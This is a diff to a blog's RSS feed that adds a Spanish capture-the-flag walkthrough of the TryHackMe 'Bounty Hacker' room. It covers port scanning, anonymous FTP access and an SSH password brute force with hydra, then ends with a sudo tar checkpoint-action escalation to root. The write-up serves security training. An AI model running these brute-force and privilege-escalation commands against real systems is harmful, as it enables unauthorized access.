@@ -6,7 +6,143 @@
         <description>Recent content in THM on d3b0o</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 07 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/categories/thm/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 08 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/categories/thm/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Bounty Hacker</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-bounty-hacker/</link>
+        <pubDate>Sun, 08 Jan 2023 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-bounty-hacker/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-bounty-hacker/images/portada.png" alt="Featured image of post Resolución Bounty Hacker" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/cowboyhacker&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/cowboyhacker&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP Víctima = 10.10.131.60&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.131.60
+PING 10.10.131.60 (10.10.131.60) 56(84) bytes of data.
+64 bytes from 10.10.131.60: icmp_seq=1 ttl=63 time=57.5 ms
+
+--- 10.10.131.60 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 57.483/57.483/57.483/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.60 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.131.60
+   5   │     [*] Open ports: 21,22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap -p21,22,80 -sC -sV 10.10.131.60
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can&#39;t get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.18.80.135
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
+|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
+|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;El nmap reporto que podemos acceder al ftp como anonymous.&lt;/p&gt;
+&lt;p&gt;Al entrar vemos dos archivos los cuales nos podemos pasar con get a nuestra máquina&lt;/p&gt;
+&lt;p&gt;En el archivo &lt;strong&gt;locks.txt&lt;/strong&gt; vemos que hay una lista de a lo mejor posibles contraseñas y en el task.txt vemos lo siguiente&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;1.) Protect Vicious.&lt;/p&gt;
+&lt;p&gt;2.) Plan for Red Eye pickup on the moon.&lt;/p&gt;
+&lt;p&gt;-lin&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;1.) Proteger a Vicious.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;2.) Plan para recoger a Red Eye en la luna.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;-lin&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Ya tenemos un usuario (&lt;strong&gt;lin&lt;/strong&gt;)&lt;/p&gt;
+&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
+&lt;p&gt;Con hydra vamos a intentar hacer fuerza bruta al usuario lin con las posibles contraseñas del logs.txt que nos hemos pasado anteriormente a nuestra máquina&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;hydra -l lin -P locks.txt 10.10.131.60 ssh -t 40
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos la contraseña&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; y proporcionando la contraseña que hemos encontrado anteriormente vemos que el usuario lin puede ejecutar tar como root.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya somos root&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolución Overpass</title>
         <link>https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/</link>
         <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
